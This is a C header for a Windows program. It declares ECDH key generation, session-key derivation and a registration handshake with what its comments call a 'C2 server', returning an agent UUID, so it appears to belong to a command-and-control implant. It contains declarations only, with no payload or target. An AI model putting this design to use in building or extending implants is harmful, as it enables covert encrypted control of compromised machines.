#ifndef ECDH_H
#define ECDH_H

#include <windows.h>
#include <bcrypt.h>
#include <stdint.h>

// ---------------------------------------------------------------------------
// SESSION_KEY — 32-byte ChaCha20-Poly1305 key derived during ECDH registration.
// Defined in ecdh.c, read by crypto.c for encryption/decryption.
// Written exactly once by derive_session_key(); never modified afterwards.
// ---------------------------------------------------------------------------
extern uint8_t SESSION_KEY[32];

// Fill buf with len cryptographically random bytes via BCrypt RNG.
void gen_random_bytes(uint8_t *buf, size_t len);

// Generate an ephemeral P-256 keypair.
// our_pub_x962 receives the 65-byte X9.62 uncompressed public key (0x04 || X || Y).
// *hPrivKey_out is the private key handle — caller must BCryptDestroyKey() it
// after calling derive_session_key().
// Returns 0 on success, -1 on failure.
int gen_ecdh_keypair(BCRYPT_KEY_HANDLE *hPrivKey_out, uint8_t our_pub_x962[65]);

// Import a peer's 65-byte X9.62 uncompressed P-256 public key into a BCrypt handle.
// Returns 0 on success, -1 on failure.
int import_peer_pubkey(const uint8_t peer_x962[65], BCRYPT_KEY_HANDLE *hKey_out);

// Perform ECDH key agreement and derive SESSION_KEY = SHA-256(shared_secret).
// Destroys both hPrivKey and hPeerPub regardless of outcome.
// Returns 0 on success, -1 on failure.
int derive_session_key(BCRYPT_KEY_HANDLE hPrivKey, BCRYPT_KEY_HANDLE hPeerPub);

// Perform the full ECDH registration handshake with the C2 server:
//   1. Generate ephemeral P-256 keypair
//   2. POST 65-byte X9.62 pubkey to /register (plaintext)
//   3. Receive server pubkey (65 bytes) + agent UUID (36 bytes)
//   4. Derive SESSION_KEY
// agent_id receives the null-terminated UUID string on success.
// Returns 0 on success, -1 on failure.
int do_register(char *agent_id, int agent_id_size);

#endif // ECDH_H